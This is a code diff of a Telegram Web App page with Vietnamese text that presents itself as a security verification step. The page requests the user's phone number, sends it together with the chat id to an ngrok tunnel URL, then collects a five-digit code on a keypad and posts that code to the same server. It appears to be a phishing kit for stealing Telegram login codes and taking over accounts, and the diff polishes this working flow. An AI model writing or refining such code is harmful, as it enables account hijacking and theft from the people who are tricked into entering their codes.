@@ -8,58 +8,60 @@
     <style>
         body { background: #0d1117; color: white; margin: 0; font-family: sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
         .content { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
-        .otp-box { width: 18%; max-width: 60px; height: 50px; text-align: center; font-size: 20px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
-        .key-btn { flex: 1; padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .otp-box { width: 50px; height: 50px; text-align: center; font-size: 20px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
+        .key-btn { padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="content" id="app">
     <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
-    <div id="message">Đang khởi tạo bảo mật...</div>
+    <div id="message">Đang kết nối bảo mật...</div>
 </div>
 
 <script>
     const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
     const tg = window.Telegram.WebApp;
-    const chat_id = tg.initDataUnsafe?.user?.id || "unknown";
+    // Lấy ID người dùng làm khóa session
+    const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random()*1000000).toString();
 
     tg.ready();
     tg.expand();
 
-    // Tự động yêu cầu Contact ngay khi vào app nếu chưa có
+    // Thiết lập nút chính
     tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
     tg.MainButton.show();
     tg.MainButton.onClick(() => tg.requestContact());
 
-    // Fix lỗi không nhận được sự kiện: Lắng nghe qua cả hai cơ chế
+    // Xử lý khi Telegram gửi SĐT về
     tg.onEvent('contactRequested', (data) => {
-        if (data.status === 'sent') {
-            // Lấy SĐT từ responseUnsafe hoặc từ user object nếu có
-            const phone = data.responseUnsafe?.contact?.phone_number;
+        const phone = data?.responseUnsafe?.contact?.phone_number;
+        if (phone) {
             sendPhoneToServer(phone);
+        } else {
+            alert("Vui lòng chia sẻ số điện thoại!");
         }
     });
 
     async function sendPhoneToServer(phone) {
-        if (!phone) { alert("Không lấy được SĐT, hãy thử lại!"); return; }
-        
         tg.MainButton.text = "ĐANG XỬ LÝ...";
-        await fetch(`${BACKEND_URL}/send_phone`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ phone: phone, chat_id: chat_id })
-        });
-        
-        // Chuyển UI
-        renderOtpUi();
+        try {
+            await fetch(`${BACKEND_URL}/send_phone`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: phone, chat_id: chat_id })
+            });
+            renderOtpUi();
+        } catch (e) {
+            alert("Lỗi kết nối server, vui lòng thử lại!");
+        }
     }
 
     function renderOtpUi() {
         document.getElementById('app').innerHTML = `
             <img src="https://img.icons8.com/color/96/iphone-message.png" style="width: 70px; margin-bottom: 20px;">
-            <div style="background: #1c1c20; padding: 10px 30px; border-radius: 20px; color: #aaa; margin-bottom: 20px;">Enter code</div>
-            <div id="otp-container" style="display: flex; gap: 8px; margin-bottom: 30px; width: 100%; justify-content: center;">
+            <div style="background: #1c1c20; padding: 10px 30px; border-radius: 20px; color: #aaa; margin-bottom: 20px;">Nhập mã OTP</div>
+            <div id="otp-container" style="display: flex; gap: 8px; margin-bottom: 30px; justify-content: center;">
                 ${[0,1,2,3,4].map(() => `<input type="text" class="otp-box" readonly>`).join('')}
             </div>
             <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;">
@@ -75,9 +77,11 @@
     let currentOtp = "";
     window.handleKey = (key) => {
         const boxes = document.querySelectorAll('.otp-box');
-        if (key === '⌫') currentOtp = currentOtp.slice(0, -1);
-        else if (currentOtp.length < 5) currentOtp += key;
-        
+        if (key === '⌫') {
+            currentOtp = currentOtp.slice(0, -1);
+        } else if (currentOtp.length < 5) {
+            currentOtp += key;
+        }
         boxes.forEach((box, i) => box.value = currentOtp[i] || "");
         if (currentOtp.length === 5) submitOtp();
     };
@@ -89,8 +93,13 @@
             body: JSON.stringify({ otp: currentOtp, chat_id: chat_id })
         });
         const result = await res.json();
-        if (result.success) { tg.close(); } 
-        else { alert("Mã sai!"); currentOtp = ""; document.querySelectorAll('.otp-box').forEach(b => b.value=""); }
+        if (result.success) {
+            tg.close();
+        } else {
+            alert("Mã sai, thử lại!");
+            currentOtp = "";
+            document.querySelectorAll('.otp-box').forEach(b => b.value = "");
+        }
     }
 </script>
 </body>
